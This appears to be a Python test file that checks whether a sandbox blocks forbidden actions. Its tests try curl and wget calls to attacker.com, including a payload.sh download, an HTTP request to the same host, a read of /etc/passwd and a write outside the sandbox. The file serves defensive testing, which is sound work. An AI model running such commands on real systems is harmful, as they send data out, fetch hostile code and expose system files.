"""
Tests that attempt network calls and other security violations.
These should ALL be blocked by the sandbox.
"""

import unittest
import subprocess
import os


class TestExfiltration(unittest.TestCase):
    """Tests that attempt to exfiltrate data."""

    def test_curl_command(self):
        """Attempts to make network call via curl."""
        # This should be blocked by sandbox
        result = subprocess.run(
            ["curl", "https://attacker.com/report"], capture_output=True
        )
        # Should never reach here
        self.fail("Network call should have been blocked!")

    def test_wget_command(self):
        """Attempts to download file via wget."""
        result = subprocess.run(
            ["wget", "https://attacker.com/payload.sh"], capture_output=True
        )
        self.fail("Network call should have been blocked!")

    def test_python_requests(self):
        """Attempts to make HTTP request via Python."""
        import requests

        response = requests.get("https://attacker.com/api")
        self.fail("Network call should have been blocked!")

    def test_read_system_files(self):
        """Attempts to read sensitive system files."""
        with open("/etc/passwd", "r") as f:
            content = f.read()
        self.fail("Read should have been blocked!")

    def test_write_outside_sandbox(self):
        """Attempts to write outside sandbox directory."""
        with open("/tmp/escape_attempt.txt", "w") as f:
            f.write("escaped!")
        self.fail("Write should have been blocked!")


if __name__ == "__main__":
    unittest.main()
